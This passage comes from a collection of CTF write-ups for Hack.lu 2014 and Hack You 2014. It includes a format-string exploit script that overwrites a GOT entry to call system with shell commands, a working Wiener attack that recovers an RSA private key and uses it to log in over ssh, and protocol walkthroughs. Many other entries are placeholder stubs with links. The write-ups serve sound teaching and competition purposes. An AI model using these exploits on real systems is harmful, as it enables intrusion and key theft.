2) Show mines
3) Delete mine
4) Show profit
5) Exit
4
Do you want to see the profit?
Location: Dingo canyon
Type: silver
y/n
n
Do you want to see the profit?
Location: Joe's rock
Type: gold
y/n
n
Do you want to see the profit?
Location: Dynamite Bill's boulder
Type: diamond
y/n
n
Do you want to see the profit?
Location: %d
Type: foo
y/n
y
Profit for location:
-143864192             <= this is the output of the printf
foo
1
```

When breaking on `fputs@PLT`, we can inspect the stack layout and we find that the user-controlled string `Type: foo` is conveniently located at stack offset `42`.

From here the exploit is straightforward: We perform two 2-byte writes to overwrite `puts@GOT` (`0x0804b028`) so that it contains the address of `printf@PLT` (`0x080485e0`), which is really `system`. The type of our mine serves both as the pointers for the `%hn` modifiers and as the shell command we want to execute.

This Python script produces output that can be piped right into the server to get the flag:

```
print 'gold>silverb'
print 1
print '%2052d%12$hn%32220d%13$hn'
print loc
print 'sh #BB\x2a\xb0\x04\x08\x28\xb0\x04\x08'
print 1
print 4
print 'n\nn\nn\ny'
print 'cat secret.txt\n' * 100
```

And sure enough:

```bash
$ python input.py | nc wildwildweb.fluxfingers.net 1423
...
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
...
```

The flag is `FLAG{d1aM0nd>G0lD}`.

## Other write-ups and resources

* <http://barrebas.github.io/blog/2014/10/26/hack-dot-lu-the-union-write-up/>
* [ELF obfuscation: how to let analysis tools show incorrect external symbol calls](http://h4des.org/blog/index.php?/archives/346-ELF-obfuscation-let-analysis-tools-show-wrong-external-symbol-calls.html)
# Hack.lu CTF 2014: Wanted: Translator

**Category:** Misc
**Points:** 35
**Author:** qll, javex
**Description:**

> Legend says there is a bank vault in Jamestown which cannot be broken into. The only way inside is through an authentication process. Even Jesse James and his companions failed to break the security of this particular bank. Can you do it?
>
> (That means you can send us 7 solutions to this challenge and will receive 5 points for each.)
>
> * SMTP
> * GOPHER
> * POP3
> * FINGER
> * TFTP
> * IRC
> * NNTP

## Write-up

In general, these challenges could be solved by connecting to wildwildweb.fluxfingers.net or 149.13.33.84 using the correct ports, and then messing around with the protocol commands a little bit.

### SMTP

```bash
$ telnet wildwildweb.fluxfingers.net 25
T: Trying 149.13.33.84...
T: Connected to wildwildweb.fluxfingers.net.
T: Escape character is '^]'.
S: 220 protocols FluxSMTPd (send a mail to our team's mail address)
C: HELO fluxmail
S: 250 protocols
C: MAIL FROM: <my-name@example.com>
S: 250 OK
C: RCPT TO:<fluxfingers@ruhr-uni-bochum.de>
S: 250 OK
C: DATA
S: 354 End data with <CR><LF>.<CR><LF>
C: from: my-name@example.com
C: subject: Can haz flag?
C:
C: Can haz flag?
C: .
S: 200 flag{deliver_that_yourself_:-P}
```

### GOPHER

```bash
$ telnet wildwildweb.fluxfingers.net 70
Trying 149.13.33.84...
Connected to wildwildweb.fluxfingers.net.
Escape character is '^]'.

0flag.txt 0 wildwildweb.fluxfingers.net 70
.
Connection closed by foreign host.

$ telnet wildwildweb.fluxfingers.net 70
Trying 149.13.33.84...
Connected to wildwildweb.fluxfingers.net.
Escape character is '^]'.
0
flag{ever_heard_of_g0pher?}
Connection closed by foreign host.
```

### POP3

```bash
$ telnet 149.13.33.84 110
Trying 149.13.33.84...
Connected to 149.13.33.84.
Escape character is '^]'.
+OK POP3 server ready (USER: flux, PASS: flux)
USER flux
+OK
PASS flux
+OK howdy
LIST
+OK 3 messages (57 octets)
0d 9
1d 39
2d 9
.
RETR 1
+OK 39 octets

Message 2 flag{once_pop3d_never_stop3d}
.
```

### FINGER

```bash
$ telnet 149.13.33.84 79
Trying 149.13.33.84...
Connected to 149.13.33.84.
Escape character is '^]'.
r00t
Login name: r00t  In real life: r00t McR00ty
Office: Luxembourg  Home phone: foo-1337
Directory: /r00t  Shell: /bin/1337shell
Plan: flag{f1nger_me_baby...scnr}
Connection closed by foreign host.
```

### TFTP

```bash
$ tftp 149.13.33.84
tftp> get FLAG
Received 1230 bytes in 0.1 seconds
tftp> ^D

$ cat FLAG
EXT. A JAIL IN MEXICO - DAY

It's an early Friday morning and a patrol car drives up an
unpaved road and parks next to a gutted police car on cinder
blocks. The camera pans with the OFFICER as he exits his car
and walks up to a ramp leading to the babay blue JAIL HOUSE.
He is carrying a greasy bag of fast food.

INT. JAIL LOBBY - DAY

The Officer enters the lobby, tosses the bag of food to his
PARTNER who is sitting at a desk. He grabs a tin cup and
walks over to barred entrance to Block A. Twenty or so
CRIMINALS, from drunks to drug dealers are sleeping
peacefully in their cell on Block A. The Officer rattles the
tin cup between the entrance bar.

INT. JAIL CELLS - DAY

The inmates stir, rubbing their dirty faces and trying to sit
up. The camera dollies slowly down the narrow hallway of the
block which has three cells: Two small ones side by side, and
one bigger cell that faces the block entrance. The sound of
scribbling and business dealing can be heard from inside the
cell. It is AZUL jottin ginto a business ledger while
chatting on his cellular phone. His cell is equipped with a
small desk and a refridgerator. He hangs up the phone and
continues writing.

flag{tftp_as_a_service}
```

### IRC

```bash
$ telnet 149.13.33.84 6667
Trying 149.13.33.84...
Connected to 149.13.33.84.
Escape character is '^]'.
nick x
user a a a a
:wildwildweb.fluxfingers.net 001 x :Hi, welcome to IRC
:wildwildweb.fluxfingers.net 002 x :Your host is wildwildweb.fluxfingers.net
:wildwildweb.fluxfingers.net 251 x :3 clients connected right now
:wildwildweb.fluxfingers.net 422 x :MOTD not set
list
:wildwildweb.fluxfingers.net 322 x #flagchannel 1 :Obtain the flag here
:wildwildweb.fluxfingers.net 323 x :End of LIST
JOIN #flagchannel
:x!a@127.0.0.1 JOIN #flagchannel
:wildwildweb.fluxfingers.net 331 x #flagchannel :Obtain the flag here
:wildwildweb.fluxfingers.net 353 x = #flagchannel :x flagbot
:wildwildweb.fluxfingers.net 366 x #flagchannel :End of NAMES list
:flagbot!flagbot@127.0.0.1 PRIVMSG x :The flag is flag{internetrelaaaaaychat}
```

### NNTP

```bash
$ telnet 149.13.33.84 119
Trying 149.13.33.84...
Connected to 149.13.33.84.
Escape character is '^]'.
200 flux news server ready
LIST
215 list of newsgroups follows
apache.chitchat 0 1 n
justhopi.things 0 1 n
.
GROUP apache.chitchat
211 2 0 1 apache.chitchat group selected
ARTICLE 1
220 1 <1292@apache.FLUX> article retrieved
Message-ID: <1292@apache.FLUX>

Ta na á née see. flag{Not_aNother_sTupid_Protocol}
```

## Other write-ups and resources

* <http://akaminsky.net/hack-lu-ctf-2014-misc-35-wanted-translator/>
# Hack.lu CTF 2014: Wiener

**Category:** Crypto
**Points:** 300
**Author:** javex
**Description:**

> It’s gold rush time! The New York Herald just reported about the Californian gold rush. We know a sheriff there is hiring guys to help him fill his own pockets. We know he already has a deadful amount of gold in his secret vault. However, it is protected by a secret only he knows. When new deputies apply for the job, they get their own secret, but that only provides entry to a vault of all deputy sheriffs. No idiot would store their stuff in this vault. But maybe we can find a way to gain access to the sheriff’s vault? Have a go at it: `nc wildwildweb.fluxfingers.net 1426`
>
> You might also need [this](wiener_38ff175d336b9c75fbf1b77290978015.py).

## Write-up

The challenge name gives a hint about Wiener, and the Python code shows that RSA is involved (see `asn1_encode_priv_key`). After reading the [Wiener attack details](http://en.wikipedia.org/wiki/Wiener%27s_attack), we are able to retrieve the private exponent `d` from the pair `(e, n)` if `d` is small enough. The challenge code (around line 220) gives us:

```python
d = prng.getrandbits(2048 // 5)
```

We can extract the pair `(e, n)` through the `p` command:

```bash
$ nc wildwildweb.fluxfingers.net 1426
Well if it isn't another one of those shave tails again. Don't you dare think this is gonna be an easy job here, we take no coffee boilers just so ya' know. If you're sure you want to join our deputy ranks, just apply here. If you got any problems just lemme know by typing 'h'.
Command: h
These are the questions you can ask me:
h: Ask the sheriff for help. He might not react too friendly...
r: Get a lock and a locker code. This way you can also unlock the shared locker for everyone!
l: Get a list of all guys that have locks.
p: Get the lock for a particular guy. Why would you need that?
Command: p
So whose lock do you wanna see? sheriff
Here this is sheriff's lock. Why do you need it, hmm?
ssh-rsa AAAAB3NzaC1yc2EAAAEAAoX41P4pzhFgXt8iGGiTfBtwrjduNNZ/m7eMKaLXnKRqYOoCpw/bQOgFtdhUJVlosrHwQ5Y9zWFxTOT8XHDsxNdWrRaF1mHbOdFagB0cOC7ZegSPD4XZCcgRaR0//iYutwzNH6fboap5E58hwUs9/pU0BJHP86WmrpYEMpV4259bzBkuFqpi9oeoA45gwBUY+MyqC+/ladra6OSTEKejw73c9jf8guU0C+9BBbUztqUxiVZQsu+jN9lMenZEd2e1EpoEvPPNlbtg9r/RoSZYUwEkrYxv1xZSuODrSC/MR1BDtBDfxP5fvGvaCMphJEKEpKtbMRvGad8MdTUmp5waVwAAAQACrrY39hUq/U+zot0WWuydW0XnDSuC54o1P3oXUYWdGW9Wy20RcAGV8Qaac9nlcQlQuBQimrTFVJODwsh+DNl/kEdIoTAkANx2tCWR2hfauvlGqq8WQPEyevFr5FuIMGA5R6nDMJyk1syfGivP2s8oX7wvcw5RWuHZNZHM2Y9cRnTsSlhZJkcA9wCk9Nz3w8NbvFefbr+A2jPGwR9oZVCSu+Zw1SJbjlcdWW/kJttZpqBar3ezkXRIss+8s71ke0Z3KxMTP8aP+ryzdSNyuUmjcEuFlt9KRPCFOT7iv4D485NxntlKs0iFL2peDEk++jLaW/YBBjoDO+r3O6R9ggXb sheriff
```

The format of the base64 blob is a set of `(len[4], item[len])` for the identifier string, `e` and `n`:

* `"00 00 00 07"`: `"ssh-rsa"`
* `"00 00 01 00"`: public exponent
* `"00 00 01 00"`: modulus

We then recover `d` and the `phi` [totient](http://en.wikipedia.org/wiki/Euler%27s_totient_function) thanks to the Wiener attack, calculate `p` (or `q`) and reuse the `asn1_encode_priv_key` Python function from the original challenge to generate the private key.

The [attack is implemented in Python](https://github.com/pablocelayes/rsa-wiener-attack) (you need to clone the Git repo of the attack to get the correct `import) and we eventually end up with the following code:

```python
import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator
import sys
import base64
import struct
import math
import fractions
import gmpy
import sympy

import pyasn1_modules.rfc3447
import pyasn1.codec.ber.encoder

def hack_RSA(e,n):
  '''
  Finds d knowing (e,n)
  applying the Wiener continued fraction attack
  '''
  frac = ContinuedFractions.rational_to_contfrac(e, n)
  convergents = ContinuedFractions.convergents_from_contfrac(frac)

  for (k,d) in convergents:

    #check if d is actually the key
    if k!=0 and (e*d-1)%k == 0:
      phi = (e*d+1)//k
      s = n - phi + 1
      # check if the equation x^2 - s*x + n = 0
      # has integer roots
      discr = s*s - 4*n
      if(discr>=0):
        t = Arithmetic.is_perfect_square(discr)
        if t!=-1 and (s+t)%2==0:
          print("Hacked!")
          return d,phi

def test_hack_RSA(e,n):
  print("Testing Wiener Attack")
  times = 1

  while(times>0):
    #e,n,d = RSAvulnerableKeyGenerator.generateKeys(1024)
    print("(e,n) is (", e, ", ", n, ")")

    hacked_d = hack_RSA(e, n)

    print("hacked_d = ", hacked_d)
    print("-------------------------")
    times -= 1

  return hacked_d

def asn1_encode_priv_key(N, e, d, p, q):
  key = pyasn1_modules.rfc3447.RSAPrivateKey()
  dp = d % (p - 1)
  dq = d % (q - 1)
  qInv = gmpy.invert(q, p)
  #assert (qInv * q) % p == 1
  key.setComponentByName('version', 0)
  key.setComponentByName('modulus', N)
  key.setComponentByName('publicExponent', e)
  key.setComponentByName('privateExponent', d)
  key.setComponentByName('prime1', p)
  key.setComponentByName('prime2', q)
  key.setComponentByName('exponent1', dp)
  key.setComponentByName('exponent2', dq)
  key.setComponentByName('coefficient', qInv)
  ber_key = pyasn1.codec.ber.encoder.encode(key)
  pem_key = base64.b64encode(ber_key).decode("ascii")
  out = ['-----BEGIN RSA PRIVATE KEY-----']
  out += [pem_key[i:i + 64] for i in range(0, len(pem_key), 64)]
  out.append('-----END RSA PRIVATE KEY-----\n')
  out = "\n".join(out)
  return out.encode("ascii")

if __name__ == "__main__":
  sys.setrecursionlimit(1500)

  keydata = base64.b64decode(sys.argv[1])

  parts = []
  while keydata:
    # read the length of the data
    dlen = struct.unpack('>I', keydata[:4])[0]

    # read in <length> bytes
    data, keydata = keydata[4:dlen+4], keydata[4+dlen:]

    parts.append(data)

  e_val = eval('0x' + ''.join(['%02X' % struct.unpack('B', x)[0] for x in
      parts[1]]))
  n_val = eval('0x' + ''.join(['%02X' % struct.unpack('B', x)[0] for x in
      parts[2]]))

  print hex(e_val)

  d_val, phi_val = test_hack_RSA(e_val, n_val)
  #d_val = 724746542590011388513367385228693742222740657137483753552318433232068370338961145215199994578740789016238655979015224570943L
  #phi_val = 338630205260455689413627911306068443537112802550361922213620660503310212139001530156458392949653034244789612680980241965923780722889133495349537107789761426092510299239678696031652780059016898519278860185536978111680123402473365833456785718098200501968322228116681190425490850863660038143310790555506293106612832752816526294946244330554558811312381169746599669997187914877490856336218310169927726408740994026774015446804415510971495034414170679517574320170326096806247477803294330492724911633596245761058343100118785517282649648198386928412053124797987039344718844068821755346442016872442675863694586221009879142600L

  print("n:%s\n"% n_val)
  print("e:%s\n"% e_val)
  print("d:%s\n"% d_val)
  print("phi:%s\n"% phi_val)

  p_val = sympy.Symbol('p_val')
  eq = sympy.Eq(p_val*p_val + (n_val+1-phi_val)*p_val + n_val)
  solved = sympy.solve(eq, p_val)

  p_val = int(-1*(solved[0]))
  q_val = int(-1*(solved[1]))

  print n_val == p_val*q_val

  print("p:%s\n"% p_val)
  print("q:%s\n"% q_val)

  print repr(p_val)
  print type(p_val)
  print asn1_encode_priv_key(n_val, e_val, d_val, p_val, q_val)
```

Running the script reveals the private key:

```bash
$ python RSAwienerHacker.py 'AAAAB3NzaC1yc2EAAAEAAoX41P4pzhFgXt8iGGiTfBtwrjduNNZ/m7eMKaLXnKRqYOoCpw/bQOgFtdhUJVlosrHwQ5Y9zWFxTOT8XHDsxNdWrRaF1mHbOdFagB0cOC7ZegSPD4XZCcgRaR0//iYutwzNH6fboap5E58hwUs9/pU0BJHP86WmrpYEMpV4259bzBkuFqpi9oeoA45gwBUY+MyqC+/ladra6OSTEKejw73c9jf8guU0C+9BBbUztqUxiVZQsu+jN9lMenZEd2e1EpoEvPPNlbtg9r/RoSZYUwEkrYxv1xZSuODrSC/MR1BDtBDfxP5fvGvaCMphJEKEpKtbMRvGad8MdTUmp5waVwAAAQACrrY39hUq/U+zot0WWuydW0XnDSuC54o1P3oXUYWdGW9Wy20RcAGV8Qaac9nlcQlQuBQimrTFVJODwsh+DNl/kEdIoTAkANx2tCWR2hfauvlGqq8WQPEyevFr5FuIMGA5R6nDMJyk1syfGivP2s8oX7wvcw5RWuHZNZHM2Y9cRnTsSlhZJkcA9wCk9Nz3w8NbvFefbr+A2jPGwR9oZVCSu+Zw1SJbjlcdWW/kJttZpqBar3ezkXRIss+8s71ke0Z3KxMTP8aP+ryzdSNyuUmjcEuFlt9KRPCFOT7iv4D485NxntlKs0iFL2peDEk++jLaW/YBBjoDO+r3O6R9ggXb'
0x285f8d4fe29ce11605edf221868937c1b70ae376e34d67f9bb78c29a2d79ca46a60ea02a70fdb40e805b5d854255968b2b1f043963dcd61714ce4fc5c70ecc4d756ad1685d661db39d15a801d1c382ed97a048f0f85d909c811691d3ffe262eb70ccd1fa7dba1aa79139f21c14b3dfe95340491cff3a5a6ae9604329578db9f5bcc192e16aa62f687a8038e60c01518f8ccaa0befe569dadae8e49310a7a3c3bddcf637fc82e5340bef4105b533b6a531895650b2efa337d94c7a76447767b5129a04bcf3cd95bb60f6bfd1a12658530124ad8c6fd71652b8e0eb482fcc475043b410dfc4fe5fbc6bda08ca61244284a4ab5b311bc669df0c753526a79c1a57L
n:338630205260455689413627911306068443537112802550361922213620660503310212139001530156458392949653034244789612680980241965923780722889133495349537107789761426092510299239678696031652780059016898519278860185536978111680123402473365833456785718098200501968322228116681190425490850863660038143310790555506293106653050174262471649179173093656763946257235681980586392230447218179278964626176124426615857733950102117938674282636936094069075258237416065546593509302494726576026227551920883962084579635168761189995794814926094510046419165007371450799003658587100556051088147493947712592469412133312536422828670173807709914587

e:318540665379393469901456665807211509077755719995811520039095212139429238053864597311950397094944291616119321660193803737677538864969915331331528398734504661147661499115125056479426948683504604460936703005724827506058051215012025774714463561829608252938657297504427643593752676857551877096958959488289759878259498255905255543409142370769036479607835226542428818361327569095305960454592450213005148130508649794732855515489990191085723757628463901282599712670814223322126866814011761400443596552984309315434653984387419451894484613987942298157348306834118923950284809853541881602043240244910348705406353947587203832407

d:724746542590011388513367385228693742222740657137483753552318433232068370338961145215199994578740789016238655979015224570943

phi:338630205260455689413627911306068443537112802550361922213620660503310212139001530156458392949653034244789612680980241965923780722889133495349537107789761426092510299239678696031652780059016898519278860185536978111680123402473365833456785718098200501968322228116681190425490850863660038143310790555506293106612832752816526294946244330554558811312381169746599669997187914877490856336218310169927726408740994026774015446804415510971495034414170679517574320170326096806247477803294330492724911633596245761058343100118785517282649648198386928412053124797987039344718844068821755346442016872442675863694586221009879142600

True
p:28216117316929874067495888027767527011360661622486842768414059951572932145196930641365509243766454218518793508840136548374994021850853203018205749779390383366761851772055038753940967432004901699256177783249460134792699230632136386268348434203012426963129659057781488950062703849444443906614331812260961682887

q:12001304129015480165432875074437607933493850611499879464845243350215176144760883615322622081442653872645865326992384034722586201972392183010813439352778246403016897976571514715418700569567613729681273931557848857971070286176848136118602099586101089743239644367344468295964691411425416652519752140536869089101

28216117316929874067495888027767527011360661622486842768414059951572932145196930641365509243766454218518793508840136548374994021850853203018205749779390383366761851772055038753940967432004901699256177783249460134792699230632136386268348434203012426963129659057781488950062703849444443906614331812260961682887L
<type 'long'>
-----BEGIN RSA PRIVATE KEY-----
MIIENgIBAAKCAQACrrY39hUq/U+zot0WWuydW0XnDSuC54o1P3oXUYWdGW9Wy20R
cAGV8Qaac9nlcQlQuBQimrTFVJODwsh+DNl/kEdIoTAkANx2tCWR2hfauvlGqq8W
QPEyevFr5FuIMGA5R6nDMJyk1syfGivP2s8oX7wvcw5RWuHZNZHM2Y9cRnTsSlhZ
JkcA9wCk9Nz3w8NbvFefbr+A2jPGwR9oZVCSu+Zw1SJbjlcdWW/kJttZpqBar3ez
kXRIss+8s71ke0Z3KxMTP8aP+ryzdSNyuUmjcEuFlt9KRPCFOT7iv4D485NxntlK
s0iFL2peDEk++jLaW/YBBjoDO+r3O6R9ggXbAoIBAAKF+NT+Kc4RYF7fIhhok3wb
cK43bjTWf5u3jCmi15ykamDqAqcP20DoBbXYVCVZaLKx8EOWPc1hcUzk/Fxw7MTX
Vq0WhdZh2znRWoAdHDgu2XoEjw+F2QnIEWkdP/4mLrcMzR+n26GqeROfIcFLPf6V
NASRz/Olpq6WBDKVeNufW8wZLhaqYvaHqAOOYMAVGPjMqgvv5Wna2ujkkxCno8O9
3PY3/ILlNAvvQQW1M7alMYlWULLvozfZTHp2RHdntRKaBLzzzZW7YPa/0aEmWFMB
JK2Mb9cWUrjg60gvzEdQQ7QQ38T+X7xr2gjKYSRChKSrWzEbxmnfDHU1JqecGlcC
NAEYqi24CTaHQf3Lk2yCWcrgmbWRTbmjbuDDxDlbu2owScEHSrCAVSlpmNdxKd83
7DSKND8CgYAoLluTIZD4lI35NEhy7M1OrXHXJbgxB38vNr+qcSKiaDuP2gi7LM0I
LF3UlBhNNjKnSk79aFH3v3jjbRLnFaOiFCz+++M2J6MYnNGJrjYiYZvTFgGeL08F
qxwplI27UVPK5dxbompgejkQJK4l3JDHVauyPyCUwQai3Fqz4dWFxwKBgBEXJg1E
F7WqxYNkCjluOXUvFk9PT91+nnR+SCqCsufuSoo0MlTiWgJlHdcuOPB+wUoVa2Ch
8xRQZ++uPEVoYXxYXEZxbGV1lPJr70fVQ1/zp9Y5uQy5qAzlK7WHbVA49qCahhDq
QKiOfP4v9Sv1+/HBtWrFAVZx+3xyLhY0fO9NAjQBGKotuAk2h0H9y5NsglnK4Jm1
kU25o27gw8Q5W7tqMEnBB0qwgFUpaZjXcSnfN+w0ijQ/AjQBGKotuAk2h0H9y5Ns
glnK4Jm1kU25o27gw8Q5W7tqMEnBB0qwgFUpaZjXcSnfN+w0ijQ/AoGAGgXFN5+n
gMSvyOCCOSN2oM9h0YogHJqbn5/iOLHPZjrSPGITcgyJkrdfvmv9z96XGLpAsSu3
BBHNM4wsyKpJVGhYzJT0MaVT5+vWm/FWuIrl59A2fRVJUZP7ThbFN84UR3Aulv9x
q7YgGrkMcwMYDOYZxsIq59S/slZPkl59i30=
-----END RSA PRIVATE KEY-----
```

Let’s copy the private key to the file `private.key` and verify that the public key generated from the private key is the same:

```bash
$ ssh-keygen -y -f private.key
ssh-rsa AAAAB3NzaC1yc2EAAAEAAoX41P4pzhFgXt8iGGiTfBtwrjduNNZ/m7eMKaLXnKRqYOoCpw/bQOgFtdhUJVlosrHwQ5Y9zWFxTOT8XHDsxNdWrRaF1mHbOdFagB0cOC7ZegSPD4XZCcgRaR0//iYutwzNH6fboap5E58hwUs9/pU0BJHP86WmrpYEMpV4259bzBkuFqpi9oeoA45gwBUY+MyqC+/ladra6OSTEKejw73c9jf8guU0C+9BBbUztqUxiVZQsu+jN9lMenZEd2e1EpoEvPPNlbtg9r/RoSZYUwEkrYxv1xZSuODrSC/MR1BDtBDfxP5fvGvaCMphJEKEpKtbMRvGad8MdTUmp5waVwAAAQACrrY39hUq/U+zot0WWuydW0XnDSuC54o1P3oXUYWdGW9Wy20RcAGV8Qaac9nlcQlQuBQimrTFVJODwsh+DNl/kEdIoTAkANx2tCWR2hfauvlGqq8WQPEyevFr5FuIMGA5R6nDMJyk1syfGivP2s8oX7wvcw5RWuHZNZHM2Y9cRnTsSlhZJkcA9wCk9Nz3w8NbvFefbr+A2jPGwR9oZVCSu+Zw1SJbjlcdWW/kJttZpqBar3ezkXRIss+8s71ke0Z3KxMTP8aP+ryzdSNyuUmjcEuFlt9KRPCFOT7iv4D485NxntlKs0iFL2peDEk++jLaW/YBBjoDO+r3O6R9ggXb
```

Now let’s log in to the sheriff’s vault:

```bash
$ ssh -p 1427 -i private.key sheriff@wildwildweb.fluxfingers.net
Woah look how much gold that old croaker has: flag{TONS_OF_GOLD_SUCH_WOW_MUCH_GLOW}
Connection to wildwildweb.fluxfingers.net closed.
```

The flag is `flag{TONS_OF_GOLD_SUCH_WOW_MUCH_GLOW}`.

## Other write-ups and resources

* [Writeup by captchaflag](http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-wiener/)
* <https://ctfcrew.org/writeup/87>
# Hack You CTF 2014: Easy one

**Category:** Crypto
**Points:** 100
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> Break my cipher and decrypt 	msg002.enc
>
> [crypto100.zip](crypto100.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/01/hack-you-2014-ctf-writeup-net100-web100-crypto100-rev100/>
* <http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto100-write-up/>
* <http://delimitry.blogspot.ru/2014/01/hack-you-2014-writeups.html>
* <http://hacktracking.blogspot.jp/2014/01/hackyou-2k14-crypto-easy-one-100-points.html>
* <http://v0ids3curity.blogspot.jp/2014/01/hack-you-ctf-2014-crypto-100-easy-one.html>
* [Japanese](http://akiym.hateblo.jp/entry/2014/01/16/111012)
* [Vietnamese](https://ctfwriteup.wordpress.com/2014/01/16/216/)
# Hack You CTF 2014: Hashme

**Category:** Crypto
**Points:** 200
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> You challange is login with administrator role
>
> nc hackyou2014tasks.ctf.su 7777
>
> Source code: [crypto200.py](crypto200.py)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto200-write-up/>
* <http://v0ids3curity.blogspot.jp/2014/01/hack-you-ctf-2014-crypto-200-hashme.html>
* [Japanese](http://akiym.hateblo.jp/entry/2014/01/16/111012)
# Hack You CTF 2014: Matrix

**Category:** Crypto
**Points:** 300
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> Do you like math?
>
> [crypto300.zip](crypto300.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://rikaard.blogspot.de/2014/01/hackyou-2014-crypto300-matrix.html>
* <http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto300-write-up/>
* <http://codezen.fr/2014/01/16/hackyou-2014-crypto-300-do-you-like-math-write-up/>
* <http://v0ids3curity.blogspot.jp/2014/01/hack-you-ctf-2014-crypto-300-matrix.html>
* [Japanese](http://akiym.hateblo.jp/entry/2014/01/16/111012)
# Hack You CTF 2014: Cryptonet

**Category:** Crypto
**Points:** 400
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> We have intercepted communication in a private network. It is used a strange protocol based on RSA cryptosystem.
>
> Can you still prove that it is not secure enough and get the flag?
>
> [crypto400.zip](crypto400.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://www.pwntester.com/blog/2014/01/17/hackyou2014-crypto400-write-up/>
* <http://codezen.fr/2014/01/16/hackyou-2014-crypto-400-cryptonet/>
* <http://v0ids3curity.blogspot.jp/2014/01/hack-you-ctf-2014-crypto-400-cryptonet.html>
* [Japanese](http://akiym.hateblo.jp/entry/2014/01/16/111012)
# Hack You CTF 2014: PCAP

**Category:** Network
**Points:** 100
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> It gave me an expired flag! What a pity
> [net100.pcap](net100.pcap)
>
> UPD after end: [password check service source code](net100.php.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://tasteless.eu/2014/01/hack-you-2014-ctf-writeup-net100-web100-crypto100-rev100/>
* <http://delimitry.blogspot.ru/2014/01/hack-you-2014-writeups.html>
* <http://hacktracking.blogspot.jp/2014/01/hackyou-2k14-network-pcap-100-points.html>
# Hack You CTF 2014: Jailbreaker

**Category:** Network
**Points:** 200
**Author:** Vlad Roskov (vos)
**Description:**

> There was a nice [Christmas release from Evad3rs](http://evasi0n.com/) to jailbreak iOS 7, but it doesn't handle my Apple TV 3G!
> Develop an Apple TV jailbreak real quick, and prove filesystem access by showing me any internal system binary from the latest firmware.
>
> Send as attachment to net200@ctf.su
> (and allow some time for manual check)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
# Hack You CTF 2014: HTTPZ

**Category:** Network
**Points:** 300
**Author:** Vlad Roskov (vos)
**Description:**

> http://54.194.41.119:0/
>
> UPD after end: [service source code](net300.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://tasteless.eu/2014/01/hack-you-2014-net-300-writeup/>
# Hack You CTF 2014: GSMd

**Category:** Network
**Points:** 400
**Author:** Vlad Roskov (vos)
**Description:**

> Welcome to Microsoft Security Assessment Lab.
> As far as we are concerned, you are once again applying for an information security job at our vacancy.
> Our policy has changed. We're not making our products secure anymore — we're now providing bugs to NSA.
> They have run out of their CYCLONE Hx9's GSM station emulators and had to switch to using real base stations for now.
>
> As your test assignment, you are to take over the base station at
> 77.220.186.142:40000
>
> Debug console: [gsmd.sh](gsmd.sh)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://codezen.fr/2014/01/15/hackyou-2014-net400-gsmd-sh-write-up/>
# Hack You CTF 2014: Trash

**Category:** PPC
**Points:** 100
**Author:** hiruma
**Description:**

> Try to get the flag from this trash>
>
> [ppc100.zip](ppc100.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://tasteless.eu/2014/01/hack-you-2014-ppc100-writeup/>
* <http://delimitry.blogspot.ru/2014/01/hack-you-2014-writeups.html>
* <http://hacktracking.blogspot.jp/2014/01/hackyou-2k14-ppc-trash-100-points.html>
# Hack You CTF 2014: Play with me

**Category:** PPC
**Points:** 200
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> nc hackyou2014tasks.ctf.su 9876
>
> UPD after end: [service source code](ppc200.py)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://hacktracking.blogspot.jp/2014/01/hackyou-2k14-ppc-play-with-me-200-points.html>
# Hack You CTF 2014: Captcha Breaker

**Category:** PPC
**Points:** 300
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> For robots only:
>
> http://hackyou2014tasks.ctf.su:30037/ppc300/
>
> UPD after end: [service source code](ppc300.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
# Hack You CTF 2014: Broken Marquee

**Category:** PPC
**Points:** 400
**Author:** Vlad Roskov (vos)
**Description:**

> On the marquee across the street there was a ticker with the flag. New year came, and now most pixels are just broken :-(
> Filmed it just in case anyone manages to recover the info.
>
> [brokenmarquee.gif](http://hackyou.ctf.su/files/brokenmarquee.gif)
>
> Hint: 99% pixels are broken.
>
> Also, [recognized pixel data](frametext.zip).

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
# Hack You CTF 2014 write-ups

* <http://hackyou.ctf.su/>
* [Scoreboard](http://hackyou.ctf.su/scoreboard)
* [Statistics](http://hackyou.ctf.su/stats)

## Completed write-ups

* none yet

## External write-ups only

* [Angrybird](web/300)
* [Broken Marquee](ppc/400)
* [Captcha Breaker](ppc/300)
* [Classic](reverse/400)
* [Cryptonet](crypto/400)
* [Easy one](crypto/100)
* [Enchanter](reverse/300)
* [GSMd](network/400)
* [Hashme](crypto/200)
* [HTTPZ](network/300)
